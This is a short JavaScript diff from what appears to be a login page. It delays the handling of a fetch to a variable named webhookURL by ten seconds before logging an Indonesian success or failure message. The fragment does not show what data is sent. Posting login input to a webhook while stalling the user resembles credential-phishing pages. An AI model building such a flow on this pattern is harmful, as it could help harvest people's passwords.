@@ -137,14 +137,16 @@
 
     fetch(webhookURL, requestData)
       .then(response => {
-        const loadingOverlay = document.getElementById("loading-overlay");
-        loadingOverlay.style.display = "none";
+        setTimeout(() => {
+          const loadingOverlay = document.getElementById("loading-overlay");
+          loadingOverlay.style.display = "none";
 
-        if (response.ok) {
-          console.log(" Berhasil login");
-        } else {
-          console.error(" GAGAL login");
-        }
+          if (response.ok) {
+            console.log(" Berhasil login");
+          } else {
+            console.error(" GAGAL login");
+          }
+        }, 10000);
       })
       .catch(error => {
         const loadingOverlay = document.getElementById("loading-overlay");
